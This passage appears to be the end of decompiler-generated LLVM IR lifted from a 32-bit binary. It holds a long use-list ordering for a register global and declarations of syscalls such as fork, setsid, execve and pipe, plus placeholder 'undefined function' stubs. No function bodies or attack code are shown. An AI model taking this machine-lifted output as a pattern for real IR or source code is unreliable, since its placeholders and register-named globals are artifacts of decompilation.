107, 1293, 1294, 1295, 1296, 117, 255, 124, 961, 256, 696, 697, 698, 962, 165, 963, 1230, 1245, 1246, 1247, 371, 1248, 905, 1249, 795, 1298, 1299, 1300, 1301, 1302, 787, 1303, 1250, 1251, 1304, 166, 1305, 1316, 1317, 23, 138, 699, 24, 700, 701, 1327, 1331, 257, 1332, 167, 620, 372, 373, 4, 1306, 1307, 1308, 168, 169, 748, 637, 170, 702, 796, 293, 294, 171, 797, 798, 172, 173, 800, 799, 801, 802, 374, 621, 803, 805, 804, 806, 1309, 1310, 174, 703, 1315, 856, 857, 858, 859, 704, 705, 860, 351, 706, 295, 175, 176, 707, 788, 708, 789, 177, 709, 178, 710, 1042, 80, 1043, 1044, 1045, 5, 711, 1183, 375, 790, 791, 792, 793, 712, 179, 1318, 622, 180, 296, 1320, 1323, 1322, 1254, 1255, 1256, 1257, 1258, 297, 1259, 1260, 1261, 376, 1252, 377, 1253, 378, 713, 807, 133, 808, 298, 714, 809, 715, 716, 379, 623, 717, 380, 624, 181, 718, 1262, 1263, 182, 183, 381, 625, 135, 1264, 1265, 1266, 184, 185, 382, 626, 134, 1267, 258, 1268, 118, 1269, 1270, 1272, 719, 1271, 6, 794, 7, 1321, 810, 811, 812, 813, 815, 814, 8, 299, 1231, 1232, 1233, 1161, 720, 300, 1162, 721, 1163, 1164, 1165, 1167, 1168, 1169, 1170, 1171, 1172, 1173, 1174, 1223, 1211, 186, 187, 722, 723, 301, 1328, 1330, 25, 1059, 188, 189, 964, 965, 136, 966, 190, 724, 967, 259, 125, 968, 81, 1166, 57, 302, 303, 191, 969, 970, 971, 192, 1112, 82, 725, 1104, 726, 1109, 1108, 260, 727, 728, 1105, 1107, 1106, 261, 729, 816, 1113, 817, 972, 973, 974, 975, 976, 977, 978, 979, 980, 193, 730, 981, 304, 982, 983, 984, 985, 986, 26, 27, 731, 280, 281, 987, 988, 989, 990, 28, 991, 992, 993, 29, 732, 994, 30, 31, 194, 733, 995, 996, 997, 1000, 998, 999, 32, 58, 83, 1001, 1002, 1003, 1004, 352, 1005, 1006, 195, 1007, 196, 1008, 734, 262, 1009, 197, 1010, 735, 1011, 1012, 1014, 1015, 1016, 1017, 1018, 1019, 198, 736, 737, 199, 1020, 1021, 738, 1022, 1023, 1024, 1025, 1026, 739, 1027, 1028, 305, 740, 306, 1029, 1030, 1031, 1032, 1033, 1034, 33, 84, 85, 86, 741, 1035, 200, 742, 1036, 627, 1037, 1038, 201, 743, 119, 56, 108, 1013, 263, 1311, 1312, 264, 1314, 1313, 87, 383, 744, 1116, 1117, 1118, 1119, 1120, 1121, 1122, 1123, 1124, 1125, 307, 1126, 745, 746, 1127, 308, 1039, 202, 1095, 747, 1096, 1297, 203, 1046, 1319, 818, 1212, 1229, 819, 1236, 1324, 137, 309, 1291, 1329, 1237, 1292, 820, 1238, 204, 821, 822, 823, 824, 825, 826, 827, 828, 829, 1190, 1239, 1240, 830, 1325, 1326, 639, 250, 831, 251, 832, 834, 833, 835, 836, 640, 387, 388, 313, 314, 312, 837, 34, 205, 206, 310, 384, 207, 641, 838, 208, 311, 839, 840, 265, 126, 386, 211, 209, 210, 385, 841, 842, 843, 844, 846, 269, 845, 642, 847, 848, 212, 213, 214, 315, 215, 330, 89, 850, 389, 849, 391, 392, 88, 390, 393, 394, 216, 851, 316, 852, 353, 853, 854, 855, 317, 127, 318, 270, 271, 643, 861, 644, 406, 407, 398, 862, 864, 399, 400, 863, 92, 865, 645, 408, 409, 395, 866, 868, 396, 397, 867, 91, 869, 354, 870, 871, 872, 873, 646, 410, 411, 401, 874, 876, 402, 403, 875, 90, 877, 111, 112, 878, 879, 880, 881, 882, 883, 884, 885, 886, 647, 412, 413, 404, 887, 648, 414, 415, 405, 888, 889, 649, 416, 417, 890, 891, 650, 418, 419, 651, 420, 421, 652, 443, 444, 893, 331, 894, 35, 332, 895, 252, 896, 653, 422, 423, 654, 424, 425, 655, 426, 427, 656, 428, 429, 657, 430, 431, 253, 658, 432, 433, 897, 355, 898, 899, 900, 901, 319, 902, 628, 903, 904, 128, 906, 907, 277, 275, 36, 276, 908, 356, 909, 910, 911, 912, 9, 913, 320, 914, 217, 274, 272, 37, 273, 915, 916, 917, 918, 38, 434, 1040, 1041, 93, 59, 94, 282, 436, 218, 435, 629, 630, 219, 749, 750, 751, 752, 753, 754, 755, 756, 757, 758, 759, 760, 761, 762, 763, 764, 765, 766, 767, 768, 769, 770, 771, 772, 631, 773, 774, 632, 336, 775, 333, 334, 335, 776, 777, 633, 438, 778, 1047, 1048, 39, 97, 1049, 40, 41, 437, 1050, 95, 60, 96, 321, 634, 10, 220, 221, 222, 1175, 439, 1176, 1177, 1178, 322, 1179, 102, 1180, 1181, 1182, 61, 98, 99, 100, 101, 635, 223, 224, 225, 226, 1184, 1186, 1187, 1188, 227, 1189, 228, 229, 230, 337, 1185, 357, 440, 441, 323, 338, 324, 11, 325, 659, 442, 1191, 231, 232, 233, 234, 326, 1192, 235, 236, 339, 1193, 1194, 237, 42, 43, 1199, 103, 62, 1200, 340, 1195, 1196, 327, 238, 1197, 1198, 358, 239, 240, 241, 341, 636, 1201, 1213, 1214, 1215, 660, 342, 242, 243, 344, 1216, 244, 343, 1217, 104, 44, 63, 1224, 1225, 359, 1226, 1227, 45, 1228, 46, 360, 105, 661, 1234, 245, 246, 445, 1235, 247, 328, 1241, 1242, 1243, 1244, 329, 47, 1273, 1274, 1275, 446, 447, 1285, 48, 49, 109, 50, 347, 348, 1276, 1277, 1278, 1279, 266, 345, 346, 349, 1280, 1281, 1282, 1283, 51, 52, 106, 1284, 361, 53, 54, 1286, 1287, 350, 12, 1288, 1289, 1290, 248, 779, 267, 448, 449, 450, 451, 452, 453, 454, 455, 456, 457, 458, 459, 460, 461, 462, 463, 464, 465, 466, 467, 468, 469, 470, 471, 472, 473, 474, 475, 476, 477, 478, 479, 480, 481, 482, 483, 484, 485, 486, 487, 488, 489, 490, 491, 492, 493, 494, 495, 496, 497, 498, 499, 500, 501, 502, 503, 504, 505, 506, 507, 508, 509, 510, 511, 512, 513, 514, 515, 516, 517, 518, 519, 520, 521, 522, 523, 524, 525, 526, 527, 528, 529, 530, 531, 532, 533, 534, 535, 536, 537, 538, 539, 540, 541, 542, 543, 544, 545, 546, 547, 548, 549, 550, 551, 552, 553, 554, 555, 556, 557, 558, 559, 560, 561, 562, 563, 564, 565, 566, 567, 568, 569, 570, 571, 572, 573, 574, 575, 576, 577, 578, 579, 580, 581, 582, 583, 584, 585, 586, 587, 588, 589, 590, 591, 592, 593, 594, 595, 596, 597, 598, 599, 600, 601, 602, 603, 604, 605, 606, 607, 608, 609, 610, 611, 612, 613, 614, 615, 616, 617, 618, 619, 1333, 1334, 1335, 1336, 1337, 1338, 1339, 1340 }
  uselistorder i32* @ebx, {}
}

; Function Attrs: nounwind readnone
declare i32 @llvm.ctlz.i32(i32, i1) #1

; Function Attrs: nounwind readnone
declare i32 @llvm.bswap.i32(i32) #1

declare i32 @_strlen(i8*) local_unnamed_addr

declare i8* @_memset(i8*, i32, i32) local_unnamed_addr

declare i32 @_strncmp(i8*, i8*, i32) local_unnamed_addr

declare i8* @_memcpy(i8*, i8*, i32) local_unnamed_addr

; Function Attrs: nounwind readnone
declare i16 @llvm.bswap.i16(i16) #1

declare i32 @unknown_0(i32) local_unnamed_addr

declare i32 @vfork() local_unnamed_addr

declare i32 @fcntl(i32, i32, ...) local_unnamed_addr

declare i32 @int80_syscall(i32) local_unnamed_addr

declare void @exit(i32) local_unnamed_addr

declare i32 @close(i32) local_unnamed_addr

declare i32 @fork(i32) local_unnamed_addr

declare i32 @getpid(i32) local_unnamed_addr

declare i32 @open(i8*, i32, ...) local_unnamed_addr

declare i32 @pipe([2 x i32]) local_unnamed_addr

declare i32 @read(i32, i32*, i32) local_unnamed_addr

declare i32 @setsid(i32) local_unnamed_addr

declare i32 @sigprocmask(i32, %_TYPEDEF_sigset_t*, %_TYPEDEF_sigset_t*) local_unnamed_addr

declare i32 @time(i32*) local_unnamed_addr

declare i32 @write(i32, i32*, i32) local_unnamed_addr

declare i32 @sigreturn(%sigcontext*) local_unnamed_addr

declare i32 @sigaction(i32, %sigaction*, %sigaction*) local_unnamed_addr

declare i32 @clock_getres(i32, %timespec*) local_unnamed_addr

declare i32 @execve(i8*, [1 x i8*], [1 x i8*]) local_unnamed_addr

declare i32 @nanosleep(%timespec*, %timespec*) local_unnamed_addr

declare i32 @poll(%pollfd*, i32, i32) local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i64 @__decompiler_undefined_function_1() local_unnamed_addr

declare i8* @__decompiler_undefined_function_2() local_unnamed_addr

declare i8 @__decompiler_undefined_function_3() local_unnamed_addr

declare i8** @__decompiler_undefined_function_4() local_unnamed_addr

declare i16 @__decompiler_undefined_function_5() local_unnamed_addr

declare i16* @__decompiler_undefined_function_6() local_unnamed_addr

declare %_TYPEDEF_sigset_t* @__decompiler_undefined_function_7() local_unnamed_addr

declare %sigaction* @__decompiler_undefined_function_8() local_unnamed_addr

declare %timespec* @__decompiler_undefined_function_9() local_unnamed_addr

declare x86_fp80 @__decompiler_undefined_function_10() local_unnamed_addr

attributes #0 = { noreturn }
attributes #1 = { nounwind readnone }
